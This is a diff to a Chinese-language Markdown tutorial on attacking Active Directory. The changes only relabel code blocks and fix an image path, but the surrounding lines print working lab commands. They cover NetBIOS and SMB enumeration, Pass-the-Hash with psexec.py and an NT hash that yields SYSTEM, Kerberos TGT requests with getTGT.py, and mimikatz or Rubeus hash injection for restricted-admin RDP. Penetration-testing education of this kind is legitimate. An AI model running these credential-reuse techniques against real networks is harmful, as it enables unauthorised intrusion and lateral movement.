@@ -201,7 +201,7 @@ dNSHostName: srv01.contoso.local
 | 445  （[SMB](https://zer1t0.gitlab.io/posts/attacking_ad/#smb)） | [ntlm-info](https://github.com/Zer1t0/ntlm-info) or nmap [smb-os-discovery](https://nmap.org/nsedoc/scripts/smb-os-discovery.html) script. |
 | 135（[RCP](https://zer1t0.gitlab.io/posts/attacking_ad/#rcp)）、139  ([NetBIOS session service](https://zer1t0.gitlab.io/posts/attacking_ad/#netbios-session-service)) | nmap                                                         |
 
-```cmd
+```powershell
 ###NetBIOS scan
 $ nbtscan 192.168.100.0/24
 192.168.100.2   CONTOSO\DC01                    SHARING DC
@@ -210,7 +210,7 @@ $ nbtscan 192.168.100.0/24
 *timeout (normal end of scan)
 ```
 
-```cmd
+```powershell
 ###SMB scan
 $ ntlm-info smb 192.168.100.0/24
 
@@ -257,7 +257,7 @@ OS: Windows 10 | Windows Server 2019 | Windows Server 2016
 
 用NT or LM哈希也能实施Pass-The-Hash，impacket tools有一个参数直接使用NT or LM哈希，为了和PsExec一起使用，需要用minikatz在window session中注入NT哈希（ [inject the NT hash in the Windows session with mimikatz](https://stealthbits.com/blog/passing-the-hash-with-mimikatz/).）
 
-```cmd
+```powershell
 ### psexec.py with a NT hash
 $ psexec.py contoso.local/Anakin@192.168.100.10 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
@@ -287,7 +287,7 @@ nt authority\system
 
 [ticket_converter](https://github.com/Zer1t0/ticket_converter) or [cerbero ](https://github.com/Zer1t0/cerbero#convert)可以转化win和linux的票据文件格式
 
-```cmd
+```powershell
 ###psexec.py with Kerberos authentication
 
 $ getTGT.py contoso.local/Anakin -dc-ip 192.168.100.2 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
@@ -339,7 +339,7 @@ Linux的话可以用freedp实施[Pass-The-Hash with RDP](https://www.kali.org/bl
 
 win的话用[ mimikatz or Rubeus](https://shellz.club/pass-the-hash-with-rdp-in-2019/)注入NT hash 或 Kerberos票据，然后在用[mstsc.exe /restrictedadmin ](https://shellz.club/pass-the-hash-with-rdp-in-2019/)建立不需要用户密码的RDP连接
 
-![1](../pics/AD_0_TO_0.9/1.png)
+![1](/pics/AD_0_TO_0.9/1.png)
 
 ## **Windows computers credentials**
 
